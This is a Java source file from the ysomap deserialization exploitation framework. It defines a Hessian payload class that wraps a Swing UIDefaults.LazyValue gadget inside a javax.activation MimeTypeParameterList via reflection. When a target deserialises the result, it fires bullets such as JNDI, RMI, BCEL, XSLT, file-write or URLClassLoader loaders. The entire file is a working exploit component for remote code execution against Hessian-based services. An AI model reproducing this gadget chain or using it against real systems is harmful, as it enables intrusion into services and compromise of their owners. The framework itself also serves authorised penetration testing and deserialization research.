package ysomap.payloads.hessian;

import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.SwingLazyValueWithRMIBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ReflectionHelper;

import javax.activation.MimeTypeParameterList;
import javax.swing.*;

/**
 * @author wh1t3P1g
 * @since 2021/11/12
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.HESSIAN })
@Dependencies({"hessian"})
@Require(bullets = {
        "SwingLazyValueWithJNDIBullet",
        "SwingLazyValueWithRMIBullet",
        "LazyValueWithFileWrite1Bullet",
        "LazyValueWithFileWrite2Bullet",
        "SwingLazyValueWithBCEL",
        "SwingLazyValueWithXSLT",
        "SwingLazyValueWithUrlClassLoaderBullet"}, param = false)
public class LazyValueWithoutToStringTrigger extends HessianPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return SwingLazyValueWithRMIBullet.newInstance(args);
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof UIDefaults.LazyValue;
    }

    @Override
    public Object pack(Object obj) throws Exception {
        UIDefaults uiDefaults = new UIDefaults();
        uiDefaults.put("ysomap", obj);
        MimeTypeParameterList mimeTypeParameterList = new MimeTypeParameterList();
        ReflectionHelper.setFieldValue(mimeTypeParameterList, "parameters", uiDefaults);
        return mimeTypeParameterList;
    }

}
